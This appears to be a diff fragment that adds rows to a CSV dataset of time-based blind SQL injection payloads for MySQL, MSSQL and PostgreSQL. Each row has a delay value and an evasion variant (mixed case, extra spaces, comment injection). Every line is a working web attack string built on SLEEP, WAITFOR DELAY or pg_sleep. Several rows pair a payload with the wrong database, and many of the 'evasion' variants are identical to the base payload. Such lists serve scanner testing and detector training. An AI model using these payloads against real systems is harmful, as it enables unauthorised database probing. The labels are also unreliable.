+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,264,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,265,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,266,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,267,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,268,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,269,time-based-blind,10,none
+"' AND IF(1=1, SLEEP(10), 0) -- ",MySQL,direct_time,270,time-based-none,10,none
+"' AND IF(1=1, S/*obf*/LEEP(10), 0) -- ",MySQL,direct_time,271,time-based-injected_comment,10,injected_comment
+"'    AND  IF(1=1,   SLEEP(10),     0)    --    ",MySQL,direct_time,272,time-based-extra_spaces,10,extra_spaces
+"' AND IF(1=1, SLEEP(10), 0) -- ",MySQL,direct_time,273,time-based-nested_fn,10,nested_fn
+"' aND iF(1=1, sleEP(10), 0) -- ",MySQL,direct_time,274,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,275,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,276,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,277,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,278,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,279,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,280,time-based-blind,1,none
+'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,281,time-based-none,1,none
+'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,282,time-based-injected_comment,1,injected_comment
+';  WAITFOR    DELAY   '00:00:01'--,MSSQL,direct_time,283,time-based-extra_spaces,1,extra_spaces
+'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,284,time-based-nested_fn,1,nested_fn
+'; WAiTFor dELay '00:00:01'--,MSSQL,direct_time,285,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,286,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,287,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,288,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,289,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,290,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,291,time-based-blind,3,none
+'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,292,time-based-none,3,none
+'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,293,time-based-injected_comment,3,injected_comment
+';     WAITFOR     DELAY     '00:00:03'--,MSSQL,direct_time,294,time-based-extra_spaces,3,extra_spaces
+'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,295,time-based-nested_fn,3,nested_fn
+'; waITFOr deLAY '00:00:03'--,MSSQL,direct_time,296,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,297,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,298,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,299,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,300,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,301,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,302,time-based-blind,5,none
+'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,303,time-based-none,5,none
+'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,304,time-based-injected_comment,5,injected_comment
+';     WAITFOR    DELAY   '00:00:05'--,MSSQL,direct_time,305,time-based-extra_spaces,5,extra_spaces
+'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,306,time-based-nested_fn,5,nested_fn
+'; WAITfoR DelaY '00:00:05'--,MSSQL,direct_time,307,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,308,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,309,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,310,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,311,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,312,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,313,time-based-blind,7,none
+'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,314,time-based-none,7,none
+'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,315,time-based-injected_comment,7,injected_comment
+';  WAITFOR   DELAY  '00:00:07'--,MSSQL,direct_time,316,time-based-extra_spaces,7,extra_spaces
+'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,317,time-based-nested_fn,7,nested_fn
+'; WaiTfOr DELAy '00:00:07'--,MSSQL,direct_time,318,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,319,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,320,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,321,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,322,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,323,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,324,time-based-blind,10,none
+'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,325,time-based-none,10,none
+'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,326,time-based-injected_comment,10,injected_comment
+';    WAITFOR   DELAY   '00:00:10'--,MSSQL,direct_time,327,time-based-extra_spaces,10,extra_spaces
+'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,328,time-based-nested_fn,10,nested_fn
+'; waITFoR deLAY '00:00:10'--,MSSQL,direct_time,329,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,330,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,331,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,332,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,333,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,334,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,335,time-based-blind,1,none
+'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,336,time-based-none,1,none
+'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,337,time-based-injected_comment,1,injected_comment
+';    IF    (1=1)    WAITFOR    DELAY  '00:00:01'--,MSSQL,direct_time,338,time-based-extra_spaces,1,extra_spaces
+'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,339,time-based-nested_fn,1,nested_fn
+'; IF (1=1) WaiTfOr DeLAY '00:00:01'--,MSSQL,direct_time,340,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,341,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,342,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,343,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,344,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,345,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,346,time-based-blind,3,none
+'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,347,time-based-none,3,none
+'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,348,time-based-injected_comment,3,injected_comment
+';   IF   (1=1)  WAITFOR  DELAY     '00:00:03'--,MSSQL,direct_time,349,time-based-extra_spaces,3,extra_spaces
+'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,350,time-based-nested_fn,3,nested_fn
+'; IF (1=1) waitFOr dELAy '00:00:03'--,MSSQL,direct_time,351,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,352,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,353,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,354,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,355,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,356,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,357,time-based-blind,5,none
+'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,358,time-based-none,5,none
+'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,359,time-based-injected_comment,5,injected_comment
+';   IF   (1=1)     WAITFOR    DELAY     '00:00:05'--,MSSQL,direct_time,360,time-based-extra_spaces,5,extra_spaces
+'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,361,time-based-nested_fn,5,nested_fn
+'; iF (1=1) WAitfOR deLay '00:00:05'--,MSSQL,direct_time,362,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,363,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,364,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,365,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,366,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,367,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,368,time-based-blind,7,none
+'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,369,time-based-none,7,none
+'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,370,time-based-injected_comment,7,injected_comment
+';  IF   (1=1)   WAITFOR     DELAY     '00:00:07'--,MSSQL,direct_time,371,time-based-extra_spaces,7,extra_spaces
+'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,372,time-based-nested_fn,7,nested_fn
+'; If (1=1) waITFoR dElAy '00:00:07'--,MSSQL,direct_time,373,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,374,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,375,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,376,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,377,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,378,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,379,time-based-blind,10,none
+'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,380,time-based-none,10,none
+'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,381,time-based-injected_comment,10,injected_comment
+';   IF     (1=1)     WAITFOR  DELAY    '00:00:10'--,MSSQL,direct_time,382,time-based-extra_spaces,10,extra_spaces
+'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,383,time-based-nested_fn,10,nested_fn
+'; IF (1=1) wAiTFOr deLAy '00:00:10'--,MSSQL,direct_time,384,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,385,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,386,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,387,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,388,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,389,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,390,time-based-blind,1,none
+1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,391,time-based-none,1,none
+1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,392,time-based-injected_comment,1,injected_comment
+1;   WAITFOR  DELAY     '00:00:01'--,MSSQL,direct_time,393,time-based-extra_spaces,1,extra_spaces
+1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,394,time-based-nested_fn,1,nested_fn
+1; waiTFor DELaY '00:00:01'--,MSSQL,direct_time,395,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,396,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,397,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,398,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,399,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,400,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,401,time-based-blind,3,none
+1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,402,time-based-none,3,none
+1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,403,time-based-injected_comment,3,injected_comment
+1;  WAITFOR    DELAY  '00:00:03'--,MSSQL,direct_time,404,time-based-extra_spaces,3,extra_spaces
+1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,405,time-based-nested_fn,3,nested_fn
+1; wAiTFOr DelaY '00:00:03'--,MSSQL,direct_time,406,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,407,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,408,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,409,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,410,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,411,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,412,time-based-blind,5,none
+1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,413,time-based-none,5,none
+1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,414,time-based-injected_comment,5,injected_comment
+1;  WAITFOR     DELAY   '00:00:05'--,MSSQL,direct_time,415,time-based-extra_spaces,5,extra_spaces
+1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,416,time-based-nested_fn,5,nested_fn
+1; WaItFoR dELay '00:00:05'--,MSSQL,direct_time,417,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,418,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,419,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,420,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,421,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,422,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,423,time-based-blind,7,none
+1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,424,time-based-none,7,none
+1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,425,time-based-injected_comment,7,injected_comment
+1;   WAITFOR     DELAY  '00:00:07'--,MSSQL,direct_time,426,time-based-extra_spaces,7,extra_spaces
+1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,427,time-based-nested_fn,7,nested_fn
+1; WAItfoR dElAY '00:00:07'--,MSSQL,direct_time,428,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,429,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,430,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,431,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,432,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,433,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,434,time-based-blind,10,none
+1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,435,time-based-none,10,none
+1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,436,time-based-injected_comment,10,injected_comment
+1;  WAITFOR     DELAY    '00:00:10'--,MSSQL,direct_time,437,time-based-extra_spaces,10,extra_spaces
+1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,438,time-based-nested_fn,10,nested_fn
+1; waitFOR delAY '00:00:10'--,MSSQL,direct_time,439,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,440,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,441,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,442,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,443,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,444,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,445,time-based-blind,1,none
+'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,446,time-based-none,1,none
+'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,447,time-based-injected_comment,1,injected_comment
+'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,448,time-based-extra_spaces,1,extra_spaces
+'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,449,time-based-nested_fn,1,nested_fn
+'+waitfOr+DELay+'00:00:01';--,MSSQL,direct_time,450,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,451,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,452,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,453,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,454,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,455,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,456,time-based-blind,3,none
+'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,457,time-based-none,3,none
+'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,458,time-based-injected_comment,3,injected_comment
+'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,459,time-based-extra_spaces,3,extra_spaces
+'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,460,time-based-nested_fn,3,nested_fn
+'+Waitfor+dElAy+'00:00:03';--,MSSQL,direct_time,461,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,462,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,463,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,464,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,465,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,466,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,467,time-based-blind,5,none
+'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,468,time-based-none,5,none
+'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,469,time-based-injected_comment,5,injected_comment
+'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,470,time-based-extra_spaces,5,extra_spaces
+'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,471,time-based-nested_fn,5,nested_fn
+'+Waitfor+DelAY+'00:00:05';--,MSSQL,direct_time,472,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,473,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,474,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,475,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,476,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,477,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,478,time-based-blind,7,none
+'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,479,time-based-none,7,none
+'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,480,time-based-injected_comment,7,injected_comment
+'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,481,time-based-extra_spaces,7,extra_spaces
+'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,482,time-based-nested_fn,7,nested_fn
+'+wAitfor+dElAY+'00:00:07';--,MSSQL,direct_time,483,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,484,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,485,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,486,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,487,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,488,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,489,time-based-blind,10,none
+'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,490,time-based-none,10,none
+'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,491,time-based-injected_comment,10,injected_comment
+'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,492,time-based-extra_spaces,10,extra_spaces
+'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,493,time-based-nested_fn,10,nested_fn
+'+waitFOr+DeLaY+'00:00:10';--,MSSQL,direct_time,494,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,495,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,496,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,497,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,498,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,499,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,500,time-based-blind,1,none
+'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,501,time-based-none,1,none
+'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,502,time-based-injected_comment,1,injected_comment
+';     SELECT    pg_sleep(1);     --,PostgreSQL,direct_time,503,time-based-extra_spaces,1,extra_spaces
+'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,504,time-based-nested_fn,1,nested_fn
+'; SeLeCT pG_SleeP(1); --,PostgreSQL,direct_time,505,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,506,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,507,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,508,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,509,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,510,time-based-blind,3,none
